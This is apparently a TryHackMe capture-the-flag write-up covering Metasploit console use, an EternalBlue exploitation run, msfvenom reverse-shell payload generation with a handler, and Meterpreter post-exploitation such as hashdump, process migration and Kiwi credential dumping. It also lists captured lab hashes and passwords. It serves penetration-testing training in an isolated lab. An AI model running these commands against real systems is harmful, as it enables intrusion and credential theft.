# TryHackMe — Metasploit Series: Write-Up

**Author:** Calebe Araújo
**Platform:** TryHackMe
**Module:** Metasploit — Complete Series (Introduction · Exploitation · Meterpreter)
**Category:** Exploitation / Post-Exploitation
**Difficulty:** Easy–Medium

---

## Table of Contents

1. [Overview](#overview)
2. [Module 1 — Introduction to Metasploit](#module-1--introduction-to-metasploit)
3. [Module 2 — Metasploit: Exploitation](#module-2--metasploit-exploitation)
4. [Module 3 — Meterpreter](#module-3--meterpreter)
5. [Key Takeaways](#key-takeaways)

---

## Overview

This write-up documents the methodology, commands, and concepts covered across the three-module Metasploit series on TryHackMe. The series progresses from foundational concepts and console usage, through active exploitation and session management, to advanced post-exploitation using Meterpreter.

These modules cover core skills for the exploitation and post-exploitation phases of a penetration test: understanding module types, configuring and launching exploits, managing sessions, and leveraging Meterpreter for deep system interaction.

---

## Module 1 — Introduction to Metasploit

### Objectives

- Understand the Metasploit Framework architecture and module types.
- Navigate the `msfconsole` interface.
- Search, configure, and execute modules.
- Manage sessions and global parameters.

---

### Task 1 — Framework Overview

The Metasploit Framework is the most widely used exploitation framework in penetration testing. It supports virtually every phase of an engagement:

| Phase                  | Description                                    |
| ---------------------- | ---------------------------------------------- |
| Information Gathering  | Auxiliary scanners, service enumeration        |
| Exploitation           | Exploits targeting known vulnerabilities       |
| Payload Delivery       | Payloads executed after successful exploitation |
| Post-Exploitation      | Credential dumping, lateral movement, pivoting |

**Two versions exist:**

| Version               | License      | Interface | Typical Use             |
| --------------------- | ------------ | --------- | ----------------------- |
| Metasploit Pro        | Commercial   | GUI       | Enterprise/automation   |
| Metasploit Framework  | Open Source  | CLI       | Majority of pentesters  |

The Framework is launched via:

```bash
msfconsole
```

---

### Task 2 — Fundamental Concepts

Before working with modules, three concepts are essential:

#### Vulnerability

A flaw in a system — caused by a programming error, logic error, or misconfiguration — that allows an attacker to gain some form of unauthorized access.

#### Exploit

Code that takes advantage of a specific vulnerability. Without a vulnerability, an exploit cannot function.

#### Payload

The code that executes on the target after a successful exploitation. It defines *what happens* once access is gained.

**Execution flow:**

```
Vulnerability
      ↓
   Exploit
      ↓
   Payload
      ↓
Desired Result
```

**Example payloads:**
- Open a shell
- Execute a command
- Install malware
- Launch Meterpreter
- Create a new user

---

### Task 2 — Module Types

Metasploit organizes its capabilities into six module categories:

| Module Type | Purpose                                                             |
| ----------- | ------------------------------------------------------------------- |
| Auxiliary   | Support tasks: scanners, brute force, fuzzers, sniffers, SQLi      |
| Encoders    | Encode payloads to attempt AV evasion (limited efficacy today)      |
| Evasion     | Actively bypass defenses such as Windows Defender and AppLocker     |
| Exploits    | Code targeting specific vulnerabilities, organized by platform      |
| NOPs        | No-operation instructions (`0x90`), used for alignment in payloads |
| Payloads    | Code executed on the target after exploitation                      |
| Post        | Post-exploitation modules: hashes, enumeration, privilege escalation|

---

### Task 2 — Payload Types

Payloads are further classified into three subtypes:

| Type    | Description                                               | Identifier  |
| ------- | --------------------------------------------------------- | ----------- |
| Singles | Self-contained; no download needed                        | `_` in name |
| Stagers | Small loader that establishes the initial connection      | `/` in name |
| Stages  | Full payload downloaded by the Stager (e.g., Meterpreter)| `/` in name |

**How to identify payload types by name:**

```
generic/shell_reverse_tcp         → Single  (note the underscore "_")
windows/x64/shell/reverse_tcp     → Staged  (note the slash "/" between shell and reverse_tcp)
```

**Task answers:**

| Question                                       | Answer               |
| ---------------------------------------------- | -------------------- |
| Code that exploits the vulnerability           | Exploit              |
| Code executed on the victim machine            | Payload              |
| Self-contained payloads                        | Singles              |
| Type of `windows/x64/pingback_reverse_tcp`     | Singles              |

---

### Task 3 — msfconsole

The `msfconsole` is the primary interface for all Metasploit operations.

#### Core Commands

| Command        | Description                                              |
| -------------- | -------------------------------------------------------- |
| `help`         | Display available commands or help for a specific one    |
| `history`      | Show previously executed commands                        |
| `search`       | Search for modules by keyword or filter                  |
| `use`          | Load a module and enter its context                      |
| `info`         | Display full details of the loaded module                |
| `show options` | List all parameters for the current module               |
| `show payloads`| List all payloads compatible with the current exploit    |
| `back`         | Exit the current module context                          |

> **Note:** Standard Linux commands (`ls`, `pwd`, `ping`, `clear`) work inside `msfconsole`. However, shell redirections like `help > file.txt` are not supported.

#### Context

One of the most important concepts in Metasploit is **context**. After loading a module with `use`, the prompt changes and all commands apply exclusively to that module:

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) >
```

#### Searching for Modules

```bash
search apache
search ms17-010
search heartbleed

# Filtered searches
search type:exploit apache
search type:auxiliary telnet
```

#### Exploit Reliability Ranking

Metasploit assigns a reliability ranking to each exploit:

| Ranking   | Meaning                                               |
| --------- | ----------------------------------------------------- |
| Excellent | Highly reliable; unlikely to crash the target         |
| Great     | Usually reliable                                      |
| Good      | Works under normal conditions                         |
| Normal    | May require specific conditions                       |
| Average   | Success rate varies                                   |
| Low       | Works rarely but included for reference               |
| Manual    | Requires manual user interaction                      |

**Task answers:**

| Question                       | Answer     |
| ------------------------------ | ---------- |
| Search for Apache modules      | `search apache` |
| Author of the found module     | `todb`     |

---

### Task 4 — Configuring Modules

After selecting a module, parameters must be configured before execution.

#### Prompt Types

| Prompt                        | Meaning                                   |
| ----------------------------- | ----------------------------------------- |
| `root@...`                    | Standard Linux shell — no MSF commands    |
| `msf6 >`                      | Main msfconsole prompt                    |
| `msf6 exploit(...) >`         | Module context loaded                     |
| `meterpreter >`               | Active Meterpreter session                |
| `C:\Windows\System32>`        | Shell on the compromised machine          |

#### Key Parameters

| Parameter | Description                                   |
| --------- | --------------------------------------------- |
| `RHOSTS`  | Target IP (single IP, CIDR, or file)          |
| `RPORT`   | Target port (e.g., 80, 443, 445)              |
| `PAYLOAD` | Payload to use                                |
| `LHOST`   | Attacker IP (for reverse connections)         |
| `LPORT`   | Local port to receive reverse connection      |
| `SESSION` | ID of an existing session (post-exploitation) |

#### Parameter Commands

```bash
set RHOSTS 10.10.10.5           # Set a parameter
set PAYLOAD windows/meterpreter/reverse_tcp

setg RHOSTS 10.10.19.23         # Set globally (persists across modules)

unset PAYLOAD                   # Remove a specific parameter
unset all                       # Remove all parameters

unsetg RHOSTS                   # Remove a global parameter
```

#### Execution Commands

```bash
exploit       # Execute the module
run           # Equivalent to exploit

exploit -z    # Exploit and immediately background the session

check         # Check if the target is vulnerable without exploiting
```

#### Session Management

```bash
sessions            # List all active sessions
sessions -i 1       # Interact with session ID 1
background          # Send current session to background (or CTRL+Z)
```

**Task answers:**

| Question                       | Answer                  |
| ------------------------------ | ----------------------- |
| Set local port to 6666         | `set LPORT 6666`        |
| Set RHOSTS globally            | `setg RHOSTS 10.10.19.23` |
| Remove configured payload      | `unset PAYLOAD`         |
| Start the exploitation         | `exploit`               |

---

## Module 2 — Metasploit: Exploitation

### Objectives

- Use Metasploit auxiliary modules for reconnaissance and enumeration.
- Search and analyze vulnerability modules.
- Execute exploits and manage resulting sessions.
- Generate custom payloads with MSFVenom.

---

### Task 2 — Scanning with Metasploit

Although Metasploit is best known for exploitation, it includes a robust set of auxiliary modules for reconnaissance.

#### Port Scanning

```bash
search portscan
use auxiliary/scanner/portscan/tcp
show options
```

Key parameters for the TCP scanner:

| Option        | Function                        |
| ------------- | ------------------------------- |
| `RHOSTS`      | Target IP or range              |
| `PORTS`       | Port range to scan              |
| `THREADS`     | Number of parallel threads      |
| `CONCURRENCY` | Simultaneous connections        |
| `TIMEOUT`     | Connection timeout              |

**Result:** 5 open ports identified on the target.

#### Nmap Integration

Nmap can be executed directly from within `msfconsole`, avoiding the need to switch between tools:

```bash
nmap -sS <TARGET_IP>
db_nmap -sS <TARGET_IP>     # Stores results in the Metasploit database
```

#### UDP Service Discovery

```bash
use auxiliary/scanner/discovery/udp_sweep
```

UDP probes discovered: **NetBIOS**

#### SMB Enumeration

```bash
use auxiliary/scanner/smb/smb_version
```

Results obtained:

| Finding              | Value                  |
| -------------------- | ---------------------- |
| Operating System     | Windows 7 Professional |
| Build                | SP1 (7601)             |
| SMB Signing          | Identified             |

#### NetBIOS Enumeration

NetBIOS name discovered: **ACME IT SUPPORT**

#### HTTP Enumeration

Service identified on port 8000: **webfs/1.21**

#### SMB Brute Force

```bash
use auxiliary/scanner/smb/smb_login
```

Credentials discovered via brute force:

| Field    | Value     |
| -------- | --------- |
| Username | `penny`   |
| Password | `leo1234` |

---

### Task 4 — Searching for Vulnerabilities

After service enumeration, relevant modules can be identified:

```bash
search vnc
info
```

Using `info` before executing any module is essential to understand:
- Module author and references
- Required parameters
- CVE identifiers
- Behavior and limitations

**Task answer:**

| Question                              | Answer           |
| ------------------------------------- | ---------------- |
| Author of the SMTP Open Relay module  | Campbell Murray  |

---

### Task 5 — Exploitation

#### EternalBlue (MS17-010)

```bash
use exploit/windows/smb/ms17_010_eternalblue
show payloads
set PAYLOAD windows/x64/shell/reverse_tcp
set RHOSTS <TARGET_IP>
set LHOST <ATTACKER_IP>
show options
exploit
```

Metasploit automatically verified:
- Target architecture
- Windows version compatibility
- MS17-010 vulnerability presence

**Result:** `Command shell session opened`

#### Session Management

```bash
sessions             # List sessions
sessions -i 1        # Interact with session 1
```

Additional session operations:
- Background: `CTRL+Z`
- Rename sessions
- Upgrade shell to Meterpreter

#### Capture Results

| Finding       | Value                         |
| ------------- | ----------------------------- |
| Flag          | `THM-5455554845`              |
| NTLM Hash     | `8ce9a3ebd1647fcc5e04025019f4b875` |
| Hash user     | `pirate`                      |

The captured NTLM hash can be used in:
- Pass-the-Hash attacks
- Offline cracking
- Lateral movement

---

### Task 6 — MSFVenom

MSFVenom is the standalone payload generation tool included with Metasploit.

#### Supported Platforms

Windows, Linux, Android, PHP, Python, ASP, Java, macOS

#### Example: Linux Meterpreter Payload

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf > shell.elf
```

#### Receiving Connections with Multi Handler

```bash
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT 4444
run
```

**Post-exploitation hash recovered:**

```
$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0
```

---

## Module 3 — Meterpreter

### Objectives

- Understand how Meterpreter operates in memory.
- Distinguish between staged and stageless payloads.
- Use core Meterpreter commands for post-exploitation.
- Migrate processes, dump credentials, and load extensions.

---

### Task 1 — Understanding Meterpreter

Meterpreter is an advanced post-exploitation agent built into Metasploit. Unlike a standard shell, it provides a rich set of built-in capabilities:

| Capability                | Description                                          |
| ------------------------- | ---------------------------------------------------- |
| File system navigation    | Browse, upload, download, search files               |
| System enumeration        | Processes, users, network info, hardware             |
| Credential harvesting     | Hash dumps, memory scraping via Kiwi/Mimikatz        |
| Screen capture            | Screenshots and live screen sharing                  |
| Keylogging                | Capture keystrokes from running processes            |
| Lateral movement          | Port forwarding, routing, pivoting                   |
| Privilege escalation      | `getsystem` and related techniques                   |

#### In-Memory Execution

One of Meterpreter's defining characteristics is that **it does not write a persistent executable to disk**. Its code is injected directly into the target's RAM, which:

- Reduces forensic artifacts on the compromised system.
- Evades AV solutions that primarily monitor disk writes.
- Allows communication over encrypted TLS channels, hindering IDS/IPS inspection.

#### Process Injection

```bash
getpid       # Returns the current process ID
ps           # Lists all running processes
```

In the lab, Meterpreter was found running **inside the `spoolsv.exe` process** — a legitimate Windows service — rather than as its own process. No `meterpreter.dll` file was found on disk, confirming in-memory execution.

---

### Task 2 — Payload Types

Meterpreter payloads follow the same staged/stageless distinction as other Metasploit payloads:

| Type      | Example Name                               | Characteristic                             |
| --------- | ------------------------------------------ | ------------------------------------------ |
| Staged    | `windows/x64/meterpreter/reverse_tcp`      | Small initial loader; downloads the rest   |
| Stageless | `windows/x64/meterpreter_reverse_tcp`      | Complete payload in a single stage         |

**When to use each:**

| Scenario                              | Recommended Type |
| ------------------------------------- | ---------------- |
| Network filtering present             | Stageless        |
| Size-constrained exploit buffer       | Staged           |
| Standard lab or controlled engagement | Either           |

#### Listing Available Meterpreter Payloads

```bash
msfvenom --list payloads | grep meterpreter
```

**Supported platforms:** Windows, Linux, Android, PHP, Python, Java, macOS, iOS

---

### Task 3 — Meterpreter Commands

After opening a session, `help` displays all available commands organized by category.

#### Core Commands

```bash
background         # Send session to background
exit               # Terminate the session
guid               # Display session GUID
sessions           # List sessions
migrate <PID>      # Migrate to another process
load               # Load an extension
run                # Execute a post module
```

#### File System Commands

```bash
pwd          # Print working directory
cd           # Change directory
ls           # List files
cat          # Display file contents
search       # Search for files by name or pattern
upload       # Upload a file to the target
download     # Download a file from the target
rm           # Delete a file
edit         # Open a file in an editor
```

#### Networking Commands

```bash
ifconfig     # Network interface information
arp          # ARP table
netstat      # Active connections
portfwd      # Port forwarding
route        # Routing table
```

#### System Commands

```bash
sysinfo      # System information
ps           # List processes
getpid       # Current process ID
getuid       # Current user
execute      # Execute a command
shell        # Drop into a system shell
kill         # Kill a process
shutdown     # Shut down the target
reboot       # Reboot the target
```

---

### Task 4 — Post-Exploitation

#### getuid

```bash
getuid
```

Returns the current user context. A result of `NT AUTHORITY\SYSTEM` confirms full system-level privileges.

#### migrate

```bash
migrate <PID>
```

Moves the Meterpreter agent into another process. Useful for:

- Increasing session stability.
- Hiding execution within a trusted process.
- Capturing input from specific processes (e.g., a browser).

> **Important:** Only migrate to processes running with privileges equal to or higher than the current user to avoid losing access.

#### hashdump

```bash
hashdump
```

Extracts NTLM hashes from the Windows SAM database. These hashes can be used for:

- Pass-the-Hash attacks
- Offline cracking
- Lateral movement across the network

#### search

```bash
search -f flag.txt
search -f *.config
```

Locates files on the target system rapidly, useful for finding:

- Configuration files containing credentials
- Backup files
- CTF flags and sensitive documents

#### shell

```bash
shell
```

Drops into a native OS shell (`cmd.exe` on Windows), allowing execution of OS-level commands directly.

---

### Task 5 — Extensions

One of Meterpreter's key strengths is its modular design. Extensions can be loaded at runtime to expand capabilities.

#### Python Extension

```bash
load python
python_execute "print('Hello')"
```

Allows executing arbitrary Python code on the compromised machine.

#### Kiwi (Mimikatz)

```bash
load kiwi
```

The Kiwi extension is a Metasploit implementation of Mimikatz, providing:

| Function               | Description                                     |
| ---------------------- | ----------------------------------------------- |
| `creds_all`            | Dump all available credentials                  |
| `lsa_dump_sam`         | Extract SAM database hashes                     |
| `kerberos_ticket_list` | List Kerberos tickets in memory                 |
| `wifi_list`            | Retrieve stored Wi-Fi passwords                 |
| `dcsync`               | Replicate domain credentials via DCSync         |
| `golden_ticket_create` | Create a Golden Ticket for persistence          |

---

### Task 5 — Lab Enumeration Results

Using Meterpreter commands and extensions, the following information was obtained from the compromised system:

| Finding               | Value                                    |
| --------------------- | ---------------------------------------- |
| Computer name         | `ACME-TEST`                              |
| Domain                | `FLASH`                                  |
| SMB share discovered  | `speedster`                              |
| NTLM hash user        | `jchambers`                              |
| NTLM hash             | `69596c7aa1e8daee17f8e78870e25a5c`       |
| Plaintext password    | `Trustno1` (recovered via Kiwi)          |

**Files located via `search`:**

| File Path                                                                    | Content                          |
| ---------------------------------------------------------------------------- | -------------------------------- |
| `c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt`            | Twitter password: `KDSvbsw3849!` |
| `c:\inetpub\wwwroot\realsecret.txt`                                          | `The Flash is the fastest man alive` |

---

## Key Takeaways

This series builds a complete Metasploit-based exploitation and post-exploitation workflow applicable to real-world penetration testing engagements:

| Phase                  | Technique                              | Primary Tool / Command                        |
| ---------------------- | -------------------------------------- | --------------------------------------------- |
| Reconnaissance         | Port scanning, service enumeration     | `auxiliary/scanner/portscan/tcp`, `db_nmap`   |
| Vulnerability Research | Module search, CVE lookup              | `search`, `info`                              |
| Exploitation           | Exploit execution, session creation    | `use`, `set`, `exploit`                       |
| Session Management     | Interact, background, upgrade          | `sessions`, `sessions -i`, `background`       |
| Post-Exploitation      | Credential dumping, file search        | `hashdump`, `search`, `migrate`               |
| Payload Generation     | Custom payloads for different targets  | `msfvenom`                                    |
| Extensions             | Kiwi (Mimikatz), Python execution      | `load kiwi`, `load python`                    |

### Complete Command Reference

```bash
# Navigation & search
search            info            use             back
show options      show payloads   help            history

# Configuration
set               setg            unset           unset all         unsetg

# Execution
exploit           run             exploit -z      check

# Session management
sessions          sessions -i     background

# Meterpreter core
getuid            getpid          sysinfo         ps
migrate           hashdump        shell           getsystem
search            download        upload          cat

# Extensions
load kiwi         load python     keyscan_start   keyscan_dump
screenshare       screenshot

# Payload generation
msfvenom          multi/handler
```

> **Note:** All techniques described in this write-up should only be applied to systems for which explicit written authorization has been obtained. Unauthorized access constitutes a violation of computer crime laws in most jurisdictions.

---

*Write-up produced as part of an ongoing offensive security portfolio. All exercises were conducted within the TryHackMe learning platform's isolated lab environments.*
